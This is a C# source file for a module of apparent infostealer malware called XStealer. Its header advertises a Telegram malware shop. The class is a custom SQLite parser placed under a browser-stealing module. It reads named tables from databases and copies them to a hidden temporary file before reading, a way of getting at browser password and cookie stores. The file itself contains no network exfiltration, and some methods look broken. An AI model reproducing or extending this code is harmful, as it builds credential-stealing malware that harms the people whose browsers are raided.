// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers
{
    using System;
    using System.IO;
    using System.Text;
    using Helpers;

    public class SqliteEx
    {
        #region Constructor SqliteEx | Конструктор SqliteEx

        public SqliteEx(string fileName)
        {
            try
            {
                if (new FileInfo(fileName)?.Length != 0)
                {
                    try
                    {
                        FileBytes = File.ReadAllBytes(fileName);
                        if (Encoding.Default.GetString(FileBytes, 0, 0xF).CompareTo(FORMAT) != 0)
                        {
                            Console.Beep();
                            throw new Exception("Not a valid SQLite 3 Database File");
                        }
                        if (FileBytes[0x34] != 0)
                        {
                            Console.Beep();
                            throw new Exception("Auto-vacuum capable database is not supported");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.Beep();
                        throw new Exception($"Error read file: {fileName}\r\n{ex}");
                    }
                    PageSize = ConvertToULong(0x10, 0x2);
                    DataBaseEncoding = ConvertToULong(0x38, 0x4);
                    ReadMasterTable(0x64);
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText("SQLITE_Error_Reader.txt", $"Possible file empty: {fileName}\r\n\r\nIn detail about error: {ex.Message}\r\n");
            }
        }

        public SqliteEx() { }

        #endregion

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для чтения таблицы БД в памяти</br>
        /// <br><b>~[ENG]~</b></br><br>Method for reading a database table in memory</br>
        /// </summary>
        /// <param name="database"><br>Файл БД для чтения</br><br>DB file for reading</br></param>
        /// <param name="table"><br>Таблица данных</br><br>Data table</br></param>
        /// <returns></returns>
        public SqliteEx ReadTableToMemory(string database, string table)
        {
            if ((!string.IsNullOrWhiteSpace(database) && !string.IsNullOrWhiteSpace(table)) && File.Exists(database))
            {
                using var ms = new MemoryStream { Position = 0 };
                try
                {
                    //using var data = new StreamWriter(ms, Encoding.UTF8);
                    //data.WriteLine(database);
                    //data.Flush();

                    byte[] stringToBytes = ConverterEx.ToBytes(false, database);
                    ms.Write(stringToBytes, 0, stringToBytes.Length);

                    // Подключаемся к файлу таблицы
                    var SQLiteConnection = new SqliteEx(ConverterEx.ToString(false, ms?.ToArray()));
                    // Читаем таблицу
                    bool? test = SQLiteConnection?.ReadTable(table);
                    if (test.HasValue)
                    {
                        return SQLiteConnection.GetRowCount() == 65536 ? null : SQLiteConnection;
                    }
                }
                catch { }
            }
            return null;
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для чтения таблицы БД c диска</br>
        /// <br><b>~[ENG]~</b></br><br>Method for reading a database table from disk</br>
        /// </summary>
        /// <param name="database"><br><b>~[RUS]~</b></br><br>Файл БД для чтения</br><br><b>~[ENG]~</b></br><br>DB file for reading</br></param>
        /// <param name="table"><br><b>~[RUS]~</b></br><br>Таблица данных</br><br><b>~[ENG]~</b></br><br>Data table</br></param>
        /// <returns></returns>
        public SqliteEx ReadTableFromTemp(string database, string table)
        {
            // Проверяем файл БД
            if ((!string.IsNullOrWhiteSpace(database) && !string.IsNullOrWhiteSpace(table)) && File.Exists(database))
            {
                try
                {
                    // Копируем данные файла в безопасное место
                    File.Copy(database, GlobalPaths.SqliteDump);
                    File.SetAttributes(GlobalPaths.SqliteDump, FileAttributes.Hidden);
                    // Подключаемся к БД
                    var SQLiteConnection = new SqliteEx(GlobalPaths.SqliteDump);
                    // Читаем таблицу
                    SQLiteConnection.ReadTable(table);
                    // Удаляем временный файл после прочтения
                    File.SetAttributes(GlobalPaths.SqliteDump, FileAttributes.Normal);
                    File.Delete(GlobalPaths.SqliteDump);
                    return SQLiteConnection.GetRowCount() == 65536 ? null : SQLiteConnection;
                }
                catch { }
            }
            return null;
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для получения данных по имени таблицы.</br>
        /// <br><b>~[ENG]~</b></br><br>Method for retrieving data from a table name.</br>
        /// </summary>
        /// <param name="row_num"><br><b>~[RUS]~</b></br><br>Номер строки</br><br><b>~[ENG]~</b></br><br>Row number</br></param>
        /// <param name="field"><br><b>~[RUS]~</b></br><br>Имя поля</br><br><b>~[ENG]~</b></br><br>Field name</br></param>
        /// <returns></returns>
        public string GetValue(int row_num, string field)
        {
            try
            {
                int num = -1, length = FieldNames.Length - 1;
                for (int i = 0; i <= length; i++)
                {
                    if (FieldNames[i].ToLower().CompareTo(field.ToLower()) == 0)
                    {
                        num = i; break;
                    }
                }
                return num == -1 ? null : GetValue(row_num, num);
            }
            catch { return ""; }
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для получения данных по номеру таблицы.</br>
        /// <br><b>~[ENG]~</b></br><br>Method for retrieving data by table number.</br>
        /// </summary>
        /// <param name="row_num"><br><b>~[RUS]~</b></br><br>Номер строки</br><br><b>~[ENG]~</b></br><br>Row number</br></param>
        /// <param name="field"><br><b>~[RUS]~</b></br><br>Индекс поля</br><br><b>~[ENG]~</b></br><br>Field index</br></param>
        /// <returns></returns>
        public string GetValue(int row_num, int field)
        {
            try
            {
                return row_num >= TableEntries.Length ? null : field >= TableEntries[row_num].Content.Length ? null : TableEntries[row_num].Content[field];
            }
            catch { return ""; }
        }

        /// <summary>
        /// <returns><br><b>~[RUS]~</b></br><br>Количество записей в таблице</br><br><b>~[ENG]~</b></br><br>Number of records in the table</br></returns>
        /// </summary>
        public int GetRowCount() => TableEntries.Length;

        public string[] GetTableNames()
        {
            string[] strArray2 = null;
            int index = 0, num3 = MasterTableEntries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (MasterTableEntries[i].ItemName == "table")
                {
                    Array.Copy(strArray2, new string[index + 1], MasterTableEntries.Length); // num3
                    Array.Sort(strArray2);
                    strArray2[index] = MasterTableEntries[i].ItemName;
                    index++;
                }
            }
            return strArray2;
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для парсинга значений из поля</br>
        /// <br><b>~[ENG]~</b></br><br>Method for parsing values ​​from a field</br>
        /// </summary>
        /// <param name="rowIndex"><br>Индекс строки</br></param>
        /// <param name="fieldName"><br>Имя поля</br></param>
        /// <returns></returns>
        public string ParseValue(int rowIndex, string fieldName)
        {
            int? num = -1;
            for (int i = 0; i <= FieldNames.Length - 1; i++)
            {
                if (FieldNames[i]?.ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
                {
                    num = i; break;
                }
            }
            return num == -1 ? null : ParseValue(rowIndex, num?.ToString());
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для считывания таблицы со смещения</br>
        /// <br><b>~[ENG]~</b></br><br>Method for reading a table from an offset</br>
        /// </summary>
        /// <param name="offset"><br><b>~[RUS]~</b></br><br>Индекс смещения</br> <br><b>~[ENG]~</b></br><br>Offset index</br></param>
        /// <returns>True/False</returns>
        private bool ReadTableFromOffset(ulong offset)
        {
            try
            {
                if (FileBytes[offset] == 13)
                {
                    uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1);
                    int num2 = 0;
                    if (TableEntries != null)
                    {
                        num2 = TableEntries.Length;
                        Array.Resize(ref TableEntries, TableEntries.Length + (int)num1 + 1);
                    }
                    else
                    {
                        TableEntries = new Structures.TableEntry[(int)num1 + 1];
                    }

                    for (uint index1 = 0; (int)index1 <= (int)num1; ++index1)
                    {
                        ulong num3 = ConvertToULong((int)offset + 8 + ((int)index1 * 2), 2);
                        if ((long)offset != 100) { num3 += offset; }
                        int endIdx1 = Gvl((int)num3);
                        CalcVertical((int)num3, endIdx1);
                        int endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1));
                        CalcVertical((int)((long)num3 + (endIdx1 - (long)num3) + 1), endIdx2);
                        ulong num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1);
                        int endIdx3 = Gvl((int)num4), endIdx4 = endIdx3;
                        long num5 = CalcVertical((int)num4, endIdx3);
                        Structures.RecordHeaderField[] array = null;
                        long num6 = (long)num4 - endIdx3 + 1;
                        int index2 = 0;
                        while (num6 < num5)
                        {
                            Array.Resize(ref array, index2 + 1);
                            int startIdx = endIdx4 + 1;
                            endIdx4 = Gvl(startIdx);
                            array[index2].Type = CalcVertical(startIdx, endIdx4);
                            array[index2].Size = array[index2].Type <= 9 ? SQLDataTypeSize[array[index2].Type] : (!IsOdd(array[index2].Type) ? (array[index2].Type - 12) / 2 : (array[index2].Type - 13) / 2);
                            num6 = num6 + (endIdx4 - startIdx) + 1; ++index2;
                        }
                        if (array != null)
                        {
                            TableEntries[num2 + (int)index1].Content = new string[array.Length];
                            int num7 = 0;
                            for (int index3 = 0; index3 <= array.Length - 1; ++index3)
                            {
                                if (array[index3].Type > 9)
                                {
                                    if (!IsOdd(array[index3].Type))
                                    {
                                        switch (DataBaseEncoding)
                                        {
                                            case 1: TableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(FileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size); break;
                                            case 2: TableEntries[num2 + (int)index1].Content[index3] = Encoding.Unicode.GetString(FileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size); break;
                                            case 3: TableEntries[num2 + (int)index1].Content[index3] = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size); break;
                                        }
                                    }
                                    else
                                    {
                                        TableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(FileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                    }
                                }
                                else
                                {
                                    TableEntries[num2 + (int)index1].Content[index3] = Convert.ToString(ConvertToULong((int)((long)num4 + num5 + num7), (int)array[index3].Size));
                                }

                                num7 += (int)array[index3].Size;
                            }
                        }
                    }
                }
                else if (FileBytes[offset] == 5)
                {
                    uint num1 = (uint)(ConvertToULong((int)((long)offset + 3), 2) - 1);
                    for (uint index = 0; (int)index <= (int)num1; ++index)
                    {
                        uint num2 = (uint)ConvertToULong((int)offset + 12 + ((int)index * 2), 2);
                        ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1) * PageSize);
                    }
                    ReadTableFromOffset((ConvertToULong((int)((long)offset + 8), 4) - 1) * PageSize);
                }
                return true;
            }
            catch { return false; }
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для чтения Мастер таблицы</br>
        /// <br><b>~[ENG]~</b></br><br>Method for reading Master table</br>
        /// </summary>
        /// <param name="offset"><br><b>~[RUS]~</b></br><br>Индекс смещения</br> <br><b>~[ENG]~</b></br><br>Offset index</br></param>
        private void ReadMasterTable(long offset)
        {
            try
            {
                switch (FileBytes[offset])
                {
                    case 5:
                        uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1);
                        for (int index = 0; index <= (int)num1; ++index)
                        {
                            uint num2 = (uint)ConvertToULong((int)offset + 12 + (index * 2), 2);
                            long numlong = ((long)ConvertToULong((int)(offset + num2), 4) - 1) * (long)PageSize;
                            long numlong2 = ((long)ConvertToULong((int)num2, 4) - 1) * (long)PageSize;
                            ReadMasterTable(offset != 100 ? numlong : numlong2);
                        }
                        ReadMasterTable(((long)ConvertToULong((int)offset + 8, 4) - 1) * (long)PageSize);
                        break;
                    case 13:
                        ulong num3 = ConvertToULong((int)offset + 3, 2) - 1;
                        int num4 = 0;
                        if (MasterTableEntries != null)
                        {
                            num4 = MasterTableEntries.Length;
                            Array.Resize(ref MasterTableEntries, MasterTableEntries.Length + (int)num3 + 1);
                        }
                        else
                        {
                            MasterTableEntries = new Structures.SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1))];
                        }

                        for (ulong index1 = 0; index1 <= num3; ++index1)
                        {
                            ulong num2 = ConvertToULong((int)offset + 8 + ((int)index1 * 2), 2);
                            if (offset != 100) { num2 += (ulong)offset; }

                            int endIdx1 = Gvl((int)num2);
                            CalcVertical((int)num2, endIdx1);
                            int endIdx2 = Gvl((int)((long)num2 + (endIdx1 - (long)num2) + 1));
                            CalcVertical((int)((long)num2 + (endIdx1 - (long)num2) + 1), endIdx2);
                            ulong num5 = num2 + (ulong)(endIdx2 - (long)num2 + 1);
                            int endIdx3 = Gvl((int)num5), endIdx4 = endIdx3;
                            long num6 = CalcVertical((int)num5, endIdx3);
                            long[] numArray = new long[5];
                            for (int index2 = 0; index2 <= 4; ++index2)
                            {
                                int startIdx = endIdx4 + 1;
                                endIdx4 = Gvl(startIdx);
                                numArray[index2] = CalcVertical(startIdx, endIdx4);
                                numArray[index2] = numArray[index2] <= 9 ? SQLDataTypeSize[numArray[index2]] : (!IsOdd(numArray[index2]) ? (numArray[index2] - 12) / 2 : (numArray[index2] - 13) / 2);
                            }
                            if ((long)DataBaseEncoding == 1 || (long)DataBaseEncoding == 2)
                            {
                                switch (DataBaseEncoding)
                                {
                                    case 1: MasterTableEntries[num4 + (int)index1].ItemName = Encoding.Default.GetString(FileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]); break;
                                    case 2: MasterTableEntries[num4 + (int)index1].ItemName = Encoding.Unicode.GetString(FileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]); break;
                                    case 3: MasterTableEntries[num4 + (int)index1].ItemName = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]); break;
                                }
                            }

                            MasterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong((int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2]), (int)numArray[3]);
                            switch (DataBaseEncoding)
                            {
                                case 1: MasterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Default.GetString(FileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]); break;
                                case 2: MasterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Unicode.GetString(FileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]); break;
                                case 3: MasterTableEntries[num4 + (int)index1].SqlStatement = Encoding.BigEndianUnicode.GetString(FileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]); break;
                            }
                        }
                        break;
                }
            }
            catch { }
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для чтения таблицы</br>
        /// <br><b>~[ENG]~</b></br><br>Method for reading the table</br>
        /// </summary>
        /// <param name="tableName"><br><b>~[RUS]~</b></br><br>Имя таблицы</br><br><b>~[ENG]~</b></br><br>Table name</br></param>
        /// <returns>True/False</returns>
        public bool ReadTable(string tableName)
        {
            try
            {
                int index1 = -1;
                for (int index2 = 0; index2 <= MasterTableEntries.Length; ++index2)
                {
                    if (string.Compare(MasterTableEntries[index2].ItemName?.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                    {
                        index1 = index2; break;
                    }
                }
                if (index1 == -1) { return false; }

                string[] strArray = MasterTableEntries[index1].SqlStatement?.Substring(MasterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
                for (int index2 = 0; index2 <= strArray.Length - 1; ++index2)
                {
                    strArray[index2] = strArray[index2].TrimStart();
                    int length = strArray[index2].IndexOf(' ');
                    if (length > 0)
                    {
                        strArray[index2] = strArray[index2].Substring(0, length);
                    }

                    if (strArray[index2].IndexOf(UNIQUE, StringComparison.Ordinal) != 0)
                    {
                        Array.Resize(ref FieldNames, index2 + 1);
                        FieldNames[index2] = strArray[index2];
                    }
                }
                return ReadTableFromOffset((ulong)(MasterTableEntries[index1].RootNum - 1) * PageSize);
            }
            catch { return false; }
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для конвертирования в тип данных ULong</br>
        /// <br><b>~[ENG]~</b></br><br>Method for converting to ULong data type</br>
        /// </summary>
        /// <param name="startIndex"><br><b>~[RUS]~</b></br><br>Начальная позиция для чтения</br><br><b>~[ENG]~</b></br><br>Starting position for reading</br></param>
        /// <param name="size"></param>
        /// <returns></returns>
        private ulong ConvertToULong(int startIndex, int size)
        {
            try
            {
                if (size <= 8 & size != 0)
                {
                    ulong num = 0;
                    for (int index = 0; index <= size - 1; ++index)
                    {
                        num = num << 8 | FileBytes[startIndex + index];
                    }
                    return num;
                }
                return 0;
            }
            catch { return 0; }
        }

        private int Gvl(int startIdx)
        {
            try
            {
                if (startIdx > FileBytes.Length) { return 0; }

                for (int index = startIdx; index <= startIdx + 0x8; ++index)
                {
                    if (index > FileBytes.Length - 1) { return 0; }
                    if ((FileBytes[index] & 0x80) != 0x80) { return index; }
                }
                return startIdx + 0x8;
            }
            catch { return 0; }
        }

        private long CalcVertical(int startIdx, int endIdx)
        {
            try
            {
                ++endIdx;
                byte[] numArray = new byte[0x8];
                int num1 = endIdx - startIdx;
                if (num1 != 0 & num1 <= 0x9)
                {
                    bool flag = false;
                    switch (num1)
                    {
                        case 1: numArray[0] = (byte)(FileBytes[startIdx] & (uint)sbyte.MaxValue); return BitConverter.ToInt64(numArray, 0);
                        case 9: flag = true; break;
                    }
                    int num2 = 1, num3 = 0x7, index1 = 0;
                    if (flag)
                    {
                        numArray[0] = FileBytes[endIdx - 1]; --endIdx; index1 = 1;
                    }
                    int index2 = endIdx - 1;
                    while (index2 >= startIdx)
                    {
                        if (index2 - 1 < startIdx && !flag)
                        {
                            numArray[index1] = (byte)((FileBytes[index2] >> (num2 - 1)) & (byte.MaxValue >> num2));
                        }
                        else
                        {
                            numArray[index1] = (byte)(((FileBytes[index2] >> (num2 - 1)) & (byte.MaxValue >> num2)) | (FileBytes[index2 - 1] << num3));
                            ++num2; ++index1; --num3;
                        }
                        index2 += -1;
                    }
                    return BitConverter.ToInt64(numArray, 0);
                }
                return 0;
            }
            catch { return 0; }
        }

        private bool IsOdd(long value) => (value & 1) == 1;

        #region Variables | Переменные
        private readonly byte[] FileBytes, SQLDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private readonly ulong DataBaseEncoding, PageSize;
        private string[] FieldNames;
        private Structures.SqliteMasterEntry[] MasterTableEntries;
        private Structures.TableEntry[] TableEntries;
        const string FORMAT = "SQLite format 3", UNIQUE = "UNIQUE";
        #endregion
    }
}